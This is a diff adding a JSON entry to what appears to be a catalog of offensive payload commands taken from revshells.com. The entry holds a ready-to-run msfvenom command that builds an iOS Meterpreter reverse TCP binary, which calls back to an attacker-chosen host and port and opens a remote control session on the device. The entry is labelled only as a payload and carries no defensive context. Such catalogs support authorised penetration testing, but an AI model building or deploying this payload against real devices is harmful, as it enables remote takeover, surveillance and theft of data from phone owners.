@@ -1,0 +1,31 @@
+{
+  "id": "rsg-msfvenom-apple-ios-meterpreter-reverse-tcp-inline",
+  "name": "RSG · MSFVenom · Apple iOS Meterpreter Reverse TCP Inline",
+  "command": "msfvenom --platform apple_ios -p apple_ios/aarch64/meterpreter_reverse_tcp lhost=<lhost> lport=<lport> -f macho -o payload",
+  "description": "M S F Venom payload — Apple iOS Meterpreter Reverse TCP Inline (via reverse-shell-generator).",
+  "platform": "cross-platform",
+  "tags": [
+    "rsg",
+    "payload",
+    "msfvenom",
+    "msfvenom",
+    "apple_ios",
+    "apple_ios",
+    "reverse"
+  ],
+  "source": "rsg",
+  "source_url": "https://www.revshells.com/",
+  "upstream_id": "MSFVenom/Apple iOS Meterpreter Reverse TCP Inline/102",
+  "category": "payloads",
+  "subcategory": "msfvenom",
+  "references": [
+    {
+      "title": "reverse-shell-generator (revshells.com)",
+      "url": "https://www.revshells.com/"
+    },
+    {
+      "title": "reverse-shell-generator GitHub",
+      "url": "https://github.com/0dayCTF/reverse-shell-generator"
+    }
+  ]
+}
